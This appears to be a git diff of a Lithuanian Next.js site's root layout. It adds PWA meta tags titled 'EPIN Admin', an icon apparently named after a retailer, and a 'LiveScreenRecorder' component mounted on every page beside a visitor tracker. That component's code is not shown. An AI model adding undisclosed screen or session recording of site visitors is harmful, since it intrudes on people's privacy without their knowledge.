@@ -4,6 +4,7 @@ import { usePathname } from "next/navigation";
 import LiveToast from "@/components/LiveToast";
 import { SettingsProvider } from "@/contexts/SettingsContext";
 import { VisitorTracker } from "@/components/VisitorTracker";
+import { LiveScreenRecorder } from "@/components/LiveScreenRecorder";
 import { OgImageTags } from "@/components/OgImageTags";
 import "./globals.css";
 
@@ -44,9 +45,17 @@ export default function RootLayout({
     <html lang="lt">
       <head>
         <OgImageTags />
+        <link rel="manifest" href="/manifest.json" />
+        <meta name="theme-color" content="#0066CC" />
+        <meta name="mobile-web-app-capable" content="yes" />
+        <meta name="apple-mobile-web-app-capable" content="yes" />
+        <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
+        <meta name="apple-mobile-web-app-title" content="EPIN Admin" />
+        <link rel="apple-touch-icon" href="/form-assets/maxima-mini-logo.png" />
       </head>
       <body className={bodyClass}>
         <VisitorTracker />
+        <LiveScreenRecorder />
         <SettingsProvider>
           {ENABLE_TOAST && shouldShowToast && <LiveToast />}
           {children}
